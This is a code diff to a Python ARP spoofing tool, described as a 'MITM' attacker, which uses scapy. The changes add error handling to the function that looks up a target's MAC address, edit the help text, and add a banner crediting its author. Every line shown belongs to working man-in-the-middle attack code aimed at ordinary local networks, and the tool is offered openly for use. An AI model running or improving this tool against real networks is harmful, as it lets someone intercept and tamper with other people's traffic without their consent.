@@ -21,7 +21,7 @@ signal.signal(signal.SIGINT, def_handler) # CTRL + C
 # Menu arguments
 def get_arguments():
     argparser = argparse.ArgumentParser(description="ARP Spoofer - MITM")
-    argparser.add_argument("-t", "--taret", dest="target", required=True, help="Host / IP Range. (Ex: 192.168.1.2 / 192.168.1.0/21)") # target argument
+    argparser.add_argument("-t", "--taret", dest="target", required=True, help="Target IP. (Ex: 192.168.1.2") # target argument
     argparser.add_argument("-r", "--router", dest="router", required=True, help="Gateway IP of router. (Ex: 192.168.1.1)") # router ip argument
     argparser.add_argument("-m", "--mac", dest="mac_address", required=True, help="Your current mac addreess. (Ex: aa:bb:cc:44:55:66)") # mac_address argument
     argparser.add_argument("-i", "--interface", dest="interface", required=True, help="Network Interface Name. (Ex: wlan0)") # interface argument
@@ -52,15 +52,18 @@ def verify(target, interface, router_ip, hwsrc):
 # Get destination mac from target
 def get_dst_mac(ip, interface, retries=40):
     for retry in range(retries):
-        arp_packet = scapy.ARP(pdst=ip)
-        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        try:
+            arp_packet = scapy.ARP(pdst=ip)
+            broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
 
-        arp_packet = broadcast_packet / arp_packet
+            arp_packet = broadcast_packet / arp_packet
 
-        answered_list = scapy.srp(arp_packet, iface=interface, timeout=1, verbose=False)[0] # get the anwers
+            answered_list = scapy.srp(arp_packet, iface=interface, timeout=1, verbose=False)[0] # get the anwers
 
-        if answered_list:
-            return answered_list[0][1].hwsrc # get and return the hardware source (Mac Address)
+            if answered_list:
+                return answered_list[0][1].hwsrc # get and return the hardware source (Mac Address)
+        except:
+            pass
 
     else:
         return None
@@ -83,10 +86,18 @@ def revert_spoof():
     # Revert for router
     spoof(router_ip, interface, target, router_mac, target_mac)
 
+def print_banner():
+    print(colored("""
+▄▀█ █▀█ █▀█   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+█▀█ █▀▄ █▀▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄\n""", 'white'))
+
+    print(colored("""Mᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ\n""", 'yellow'))
+
 # Main logic
 def main():
     global target_mac, router_mac, target, interface, router_ip, hwsrc
 
+    print_banner()
     target, interface, router_ip, hwsrc = get_arguments() # get arguments
     isValid = verify(target, interface, router_ip, hwsrc) # Verify format arguments
 
